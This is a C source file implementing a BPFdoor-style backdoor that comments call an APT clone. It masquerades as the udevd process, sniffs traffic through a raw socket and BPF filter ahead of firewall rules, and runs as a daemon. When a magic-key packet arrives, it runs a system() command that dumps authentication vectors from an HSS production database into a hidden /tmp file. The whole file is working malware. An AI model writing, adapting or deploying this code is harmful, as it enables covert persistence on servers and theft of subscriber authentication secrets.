#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/filter.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/prctl.h>

// The "Magic" password that the APT uses to wake up the backdoor
#define MAGIC_KEY "skthss_apt_awake"

// Camouflage process name
#define FAKE_PROCNAME "/sbin/udevd -d"

// BPF Filter: We only want IP packets (to reduce noise)
struct sock_filter bpf_code[] = {
    { 0x28, 0, 0, 0x0000000c }, // ldh [12] (Ethertype)
    { 0x15, 0, 1, 0x00000800 }, // jeq #0x800, L1, L2 (Is it IP?)
    { 0x06, 0, 0, 0x00040000 }, // ret #262144 (Accept)
    { 0x06, 0, 0, 0x00000000 }  // ret #0 (Drop)
};

void hide_process(int argc, char *argv[]) {
    // Change process name in process list (ps, top)
    strncpy(argv[0], FAKE_PROCNAME, strlen(argv[0]));
    prctl(PR_SET_NAME, (unsigned long)"udevd", 0, 0, 0);
}

void parse_packet(unsigned char *buffer, int size) {
    struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
    int iphdrlen = iph->ihl * 4;
    
    unsigned char *payload = NULL;
    int payload_len = 0;

    if (iph->protocol == IPPROTO_ICMP) {
        struct icmphdr *icmph = (struct icmphdr *)(buffer + iphdrlen + sizeof(struct ethhdr));
        payload = (unsigned char *)(buffer + iphdrlen + sizeof(struct ethhdr) + sizeof(struct icmphdr));
        payload_len = size - (iphdrlen + sizeof(struct ethhdr) + sizeof(struct icmphdr));
    } 
    else if (iph->protocol == IPPROTO_TCP) {
        struct tcphdr *tcph = (struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
        int tcphdrlen = tcph->doff * 4;
        payload = (unsigned char *)(buffer + iphdrlen + sizeof(struct ethhdr) + tcphdrlen);
        payload_len = size - (iphdrlen + sizeof(struct ethhdr) + tcphdrlen);
    }

    if (payload != NULL && payload_len >= strlen(MAGIC_KEY)) {
        if (memcmp(payload, MAGIC_KEY, strlen(MAGIC_KEY)) == 0) {
            // Magic packet received!
            // In a real BPFdoor, it would extract an IP/Port from the payload and spawn a reverse shell.
            // For this clone, we simulate dropping a payload indicating compromise.
            FILE *f = fopen("/tmp/.hss_compromised", "w");
            if (f) {
                fprintf(f, "APT Backdoor Activated by Magic Packet.\n");
                fprintf(f, "Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
                fprintf(f, "Executing exfiltration routine...\n");
                fclose(f);
                
                // Simulate data exfiltration command execution
                system("sqlite3 real_hss_system/db/hss_production.db 'SELECT * FROM authentication_vectors LIMIT 10;' > /tmp/.hss_exfil.dat");
            }
        }
    }
}

int main(int argc, char *argv[]) {
    int raw_sock;
    unsigned char buffer[65536];
    
    // 1. Camouflage
    hide_process(argc, argv);

    // 2. Open Raw Socket (Requires Root)
    raw_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (raw_sock < 0) {
        perror("Socket Error. Are you root?");
        return 1;
    }

    // 3. Attach BPF Filter to drop unwanted packets AT THE KERNEL LEVEL
    // This allows sniffing BEFORE iptables rules apply.
    struct sock_fprog bpf = {
        .len = sizeof(bpf_code) / sizeof(bpf_code[0]),
        .filter = bpf_code
    };
    
    if (setsockopt(raw_sock, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf)) < 0) {
        perror("Failed to attach BPF");
        close(raw_sock);
        return 1;
    }

    // 4. Daemonize (run in background, detach from terminal)
    if (daemon(0, 0) == -1) {
        perror("Failed to daemonize");
        return 1;
    }

    // 5. Sniffing Loop
    while (1) {
        int data_size = recvfrom(raw_sock, buffer, 65536, 0, NULL, NULL);
        if (data_size < 0) {
            continue;
        }
        parse_packet(buffer, data_size);
    }

    close(raw_sock);
    return 0;
}
